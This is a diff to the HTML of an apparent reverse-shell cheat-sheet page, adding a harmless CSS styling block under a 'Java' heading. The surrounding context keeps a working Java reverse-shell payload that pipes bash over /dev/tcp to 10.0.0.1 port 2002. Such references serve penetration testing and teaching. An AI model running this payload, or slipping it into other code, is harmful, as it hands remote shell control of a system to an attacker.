@@ -161,6 +161,12 @@
 </code></pre></div><p> </p>
 <h2 id="java">Java</h2>
 <p> </p>
+<pre>
+<code class="language-less">body {
+  background-color: #000;
+    color: #fff;
+    }</code>
+</pre>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">r <span style="color:#f92672">=</span> Runtime.getRuntime<span style="color:#f92672">()</span>
 p <span style="color:#f92672">=</span> r.exec<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#f92672">]</span> as String<span style="color:#f92672">[])</span>
 p.waitFor<span style="color:#f92672">()</span>
